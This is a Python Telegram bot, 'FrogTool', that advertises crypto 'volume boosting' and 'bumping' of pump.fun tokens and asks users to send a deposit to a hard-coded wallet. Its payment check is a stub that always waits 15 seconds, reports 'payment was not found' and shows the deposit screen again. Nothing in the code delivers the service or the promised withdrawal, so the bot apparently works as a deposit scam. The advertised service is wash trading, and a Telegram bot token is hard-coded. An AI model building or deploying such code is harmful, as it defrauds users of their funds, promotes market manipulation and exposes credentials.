import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import asyncio
import re

# Configurar logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Constantes
TELEGRAM_TOKEN = "7864499723:AAGvFt_779h0OzMg7eN_vJvHA2-Yfxu3ICg"
BOT_WALLET = "8LWjJiHHVakmLkC2xVcH9ScfokNyXCab3dR9NhjUfphs"

# Constantes de preço
PLATFORM_FEE = 0.0002
PRIORITY_FEE = 0.00007
SERVICE_FEE = 0.000082
BUMP_PRICE = PLATFORM_FEE + PRIORITY_FEE + SERVICE_FEE

# Configurações padrão
DEFAULT_CONFIG = {
    'amount': 0.01,
    'deposit': 0.5,
    'frequency': 13,
    'time': 9,  # Começa com 9 minutos
    'bumps': 3
}

# Limites e incrementos
LIMITS = {
    'amount': {'min': 0.01, 'max': 1.0, 'step': 0.01},
    'deposit': {'min': 0.5, 'max': 100.0, 'step': 0.1},
    'frequency': [5, 7, 13, 15, 20, 25, 30],
    'time': list(range(9, 61, 3)),  # 9, 12, 15, ..., 57, 60 minutos
    'bumps': [3, 6, 9]
}

def format_config_message(config):
    """Formata a mensagem do configurador"""
    total_deposit = config['deposit']
    withdrawable = total_deposit * 0.25  # 25% do depósito
    balance = total_deposit
    
    usable_balance = total_deposit - withdrawable
    bumps_per_round = config['bumps']
    
    # Tempo máximo em segundos
    max_time_seconds = config['time'] * 60
    
    # Número de rodadas possíveis no tempo máximo
    max_rounds_by_time = max_time_seconds // config['frequency']
    
    # Número de bumps no tempo máximo
    total_bumps_by_time = max_rounds_by_time * bumps_per_round
    
    # Custo total dos bumps
    total_cost = total_bumps_by_time * BUMP_PRICE
    
    # Verifica se tem saldo suficiente
    if total_cost > usable_balance:
        # Se não tiver saldo suficiente, recalcula baseado no saldo
        max_rounds_by_balance = int(usable_balance / (BUMP_PRICE * bumps_per_round))
        total_rounds = max_rounds_by_balance
        total_bumps = total_rounds * bumps_per_round
        total_cost = total_bumps * BUMP_PRICE
    else:
        # Se tiver saldo suficiente, usa o limite de tempo
        total_rounds = max_rounds_by_time
        total_bumps = total_bumps_by_time
    
    # Tempo real da sessão
    total_time_seconds = total_rounds * config['frequency']
    minutes = total_time_seconds // 60
    seconds = total_time_seconds % 60
    
    remaining_balance = usable_balance - total_cost
    
    return (
        "🧾 Receipt (💊 Pumpfun Pay-As-You-Go 🏃)\n"
        "✅ Bump as many tokens as you want\n\n"
        f"📥 Total to deposit: {total_deposit:.3f}\n"
        f"💵 Balance: {balance:.6f}\n"
        f"🏛️ Deposit: {withdrawable:.6f} /withdrawable\n\n"
        f"Bump price: {BUMP_PRICE:.6f} /bumpprice\n"
        "it includes:\n"
        f"Platform fee: {PLATFORM_FEE:.6f}\n"
        f"Priority fee: {PRIORITY_FEE:.6f}\n"
        f"Service fee: {SERVICE_FEE:.6f}\n\n"
        f"🧮 Session details:\n"
        f"• {bumps_per_round} bumps every {config['frequency']}s\n"
        f"• Maximum time: {config['time']} minutes\n"
        f"• Total bumps: {total_bumps}\n"
        f"• Duration: {minutes}m {seconds}s\n"
        f"• Cost: {total_cost:.6f}\n"
        f"• Remaining: {remaining_balance:.6f}\n"
        f"+ always withdrawable {withdrawable:.6f} /withdrawable\n\n"
        "no additional fees are applied"
    )

def get_config_keyboard(config):
    """Retorna o teclado do configurador"""
    keyboard = [
        [
            InlineKeyboardButton("➖", callback_data='amount_decrease'),
            InlineKeyboardButton(f"Amount: {config['amount']:.2f}", callback_data='amount_info'),
            InlineKeyboardButton("➕", callback_data='amount_increase')
        ],
        [
            InlineKeyboardButton("➖", callback_data='deposit_decrease'),
            InlineKeyboardButton(f"Deposit: {config['deposit']:.1f}", callback_data='deposit_info'),
            InlineKeyboardButton("➕", callback_data='deposit_increase')
        ],
        [
            InlineKeyboardButton("➖", callback_data='frequency_decrease'),
            InlineKeyboardButton(f"Frequency: {config['frequency']}s", callback_data='frequency_info'),
            InlineKeyboardButton("➕", callback_data='frequency_increase')
        ],
        [
            InlineKeyboardButton("➖", callback_data='time_decrease'),
            InlineKeyboardButton(f"Time: {config['time']}m", callback_data='time_info'),
            InlineKeyboardButton("➕", callback_data='time_increase')
        ],
        [
            InlineKeyboardButton("➖", callback_data='bumps_decrease'),
            InlineKeyboardButton(f"Bumps: {config['bumps']}", callback_data='bumps_info'),
            InlineKeyboardButton("➕", callback_data='bumps_increase')
        ],
        [
            InlineKeyboardButton("✅ Confirm", callback_data='confirm_config'),
            InlineKeyboardButton("🔙 Back", callback_data='back_to_start')
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando inicial do bot"""
    keyboard = [
        [InlineKeyboardButton("🚀 Volume Booster", callback_data='volume_booster')],
        [InlineKeyboardButton("🏃 Pay-As-You-Go Bumper", callback_data='pay_as_you_go')],
        [InlineKeyboardButton("🎟️ FIXED Bumper", callback_data='fixed')],
        [InlineKeyboardButton("📊 Analysis", callback_data='analysis')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🐸 Welcome to FrogTool! 🐸\n\n"
        "®️ 🚀 VOLUME BOOSTER How it works?\n"
        "Ready to elevate your project on Raydium? Our Volume Bot boosts trading volume, enhances token visibility, and draws investors attention\n"
        "*It boosts with bundles. Every bundle consists of * 3 buys and 1 sell made from unique wallets\n\n"
        "Choose your service:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

def is_valid_pumpfun_url(text):
    """Verifica se é uma URL válida do pump.fun ou um endereço de contrato"""
    # Verifica se é uma URL do pump.fun
    if text.startswith('https://pump.fun/coin/'):
        return True
    # Verifica se é um endereço de contrato (apenas caracteres alfanuméricos com tamanho específico)
    if len(text) == 44 and text.isalnum():
        return True
    return False

async def handle_text_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Processa comandos de texto"""
    text = update.message.text.lower()
    
    if text == '/bumpprice':
        await show_bump_price_info(update, context)
        return
    elif text == '/withdrawable':
        await show_withdrawable_info(update, context)
        return
    
    # Verifica se estamos esperando uma URL
    if context.user_data.get('waiting_for_url'):
        if not is_valid_pumpfun_url(text):
            await update.message.reply_text(
                "⚠️ Please, enter a pumpfun link(or single contract address) below\n\n"
                "Example: https://pump.fun/coin/4TgsKLurtR71jMoVMC3Un3V3fdNRFwX6Dj9ny1T9pump"
            )
            return
        
        # URL válida, podemos prosseguir
        context.user_data['pumpfun_url'] = text
        context.user_data['waiting_for_url'] = False
        
        # Mostra a tela de pagamento
        await show_payment_screen(update, context)
        return

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gerencia callbacks dos botões"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'confirm_config':
        config_text = (
            "✅ Configuration saved!\n\n"
            f"Amount: {context.user_data['config']['amount']:.2f}\n"
            f"Deposit: {context.user_data['config']['deposit']:.1f}\n"
            f"Frequency: {context.user_data['config']['frequency']}s\n"
            f"Time: {context.user_data['config']['time']}m\n"
            f"Bumps per round: {context.user_data['config']['bumps']}\n\n"
            "⚠️ Please, enter a pumpfun link(or single contract address) below\n\n"
            "Example: https://pump.fun/coin/4TgsKLurtR71jMoVMC3Un3V3fdNRFwX6Dj9ny1T9pump"
        )
        context.user_data['waiting_for_url'] = True
        await query.edit_message_text(text=config_text)
        return

    if query.data == 'i_paid':
        await check_payment(update, context)
        return

    if query.data == 'back_to_start':
        await start(update, context)
        return
        
    if query.data == 'back_to_config':
        await show_configurator(update, context)
        return
        
    if query.data == 'bumpprice':
        await show_bump_price_info(update, context)
        return

    if query.data == 'volume_booster':
        keyboard = [
            [InlineKeyboardButton("⚙️ Configurator", callback_data='configurator')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_to_main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        text = ("🚀 Volume Booster ®️ raydium\n\n"
                "- Boosts trading volume\n"
                "- Enhances token visibility\n"
                "- Draws investors attention\n\n"
                "Click Configurator to start!")
        await query.edit_message_text(text=text, reply_markup=reply_markup)
        return

    if query.data == 'configurator':
        if 'config' not in context.user_data:
            context.user_data['config'] = DEFAULT_CONFIG.copy()
        await show_configurator(update, context)
        return

    # Processar ajustes de configuração
    if '_' in query.data:
        parts = query.data.split('_')
        param, action = parts[0], parts[1]
        
        if 'config' not in context.user_data:
            context.user_data['config'] = DEFAULT_CONFIG.copy()
            
        if param in ['amount', 'deposit', 'frequency', 'time', 'bumps'] and action in ['increase', 'decrease']:
            context.user_data['config'][param] = adjust_value(
                context.user_data['config'][param],
                action,
                LIMITS[param]
            )
            
        await show_configurator(update, context)

async def show_configurator(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mostra o configurador"""
    if 'config' not in context.user_data:
        context.user_data['config'] = DEFAULT_CONFIG.copy()
    
    message = format_config_message(context.user_data['config'])
    keyboard = get_config_keyboard(context.user_data['config'])
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=message,
            reply_markup=keyboard
        )
    else:
        await update.message.reply_text(
            text=message,
            reply_markup=keyboard
        )

async def show_bump_price_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mostra informações detalhadas sobre o bump price"""
    keyboard = [[InlineKeyboardButton("OK, got it!", callback_data='back_to_config')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        "💡 *Bump price = Platform fee + Priority fee + Service fee*\n\n"
        "🔄 *Bump* - a confirmed transaction that does BUY and SELL of your token\n\n"
        "🏢 *Platform fee* - % from a bump amount and no other bump bot can avoid it or lower it\n\n"
        "🚀 *Priority fee* - incentive for validators to put your transaction in a block as fast as possible. "
        "If you feel that your transactions are stuck, increase it\n\n"
        "🤖 *Service fee* - is the bot's fee and it is applied to each bump. "
        "It builds up over the course of a bump process and is subtracted hours after a bot has finished"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            text=message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )

async def show_withdrawable_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mostra informações sobre o depósito withdrawable"""
    keyboard = [[InlineKeyboardButton("OK, got it!", callback_data='back_to_config')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        "🏛️ Required deposit is nesessary to do transactions, otherwise it would fail\n\n"
        "❗You can always withdraw it by clicking WITHDRAW button"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=message,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text=message,
            reply_markup=reply_markup
        )

async def show_payment_screen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mostra a tela de pagamento"""
    keyboard = [
        [InlineKeyboardButton("💰 I paid", callback_data='i_paid')],
        [InlineKeyboardButton("🔙 Back", callback_data='back_to_config')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    deposit_message = (
        "To continue, a minimum deposit is required. These funds will be used for bumping, no additional fees are charged\n\n"
        f"📥 Left to deposit: {context.user_data['config']['deposit']:.3f}\n"
        f"🤖 To: {BOT_WALLET}"
    )
    
    if update.callback_query:
        await update.callback_query.edit_message_text(
            text=deposit_message,
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            text=deposit_message,
            reply_markup=reply_markup
        )

async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Simula verificação de pagamento"""
    # Mostra mensagem de verificação
    await update.callback_query.edit_message_text("Checking payment...")
    
    # Espera 15 segundos
    await asyncio.sleep(15)
    
    # Mostra mensagem de erro
    await update.callback_query.edit_message_text("❌ The payment was not found")
    
    # Espera 2 segundos antes de voltar à tela de pagamento
    await asyncio.sleep(2)
    
    # Volta para a tela de pagamento
    await show_payment_screen(update, context)

def adjust_value(current, action, limits):
    """Ajusta um valor baseado nos limites"""
    if isinstance(limits, list):
        current_idx = limits.index(current)
        if action == 'increase':
            new_idx = min(current_idx + 1, len(limits) - 1)
        else:
            new_idx = max(current_idx - 1, 0)
        return limits[new_idx]
    else:
        step = limits['step']
        if action == 'increase':
            new_value = current + step
            return min(new_value, limits['max'])
        else:
            new_value = current - step
            return max(new_value, limits['min'])

def main():
    """Função principal do bot"""
    application = Application.builder().token(TELEGRAM_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("bumpprice", lambda u, c: show_bump_price_info(u, c)))
    application.add_handler(CommandHandler("withdrawable", lambda u, c: show_withdrawable_info(u, c)))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_commands))
    
    application.run_polling()

if __name__ == '__main__':
    main()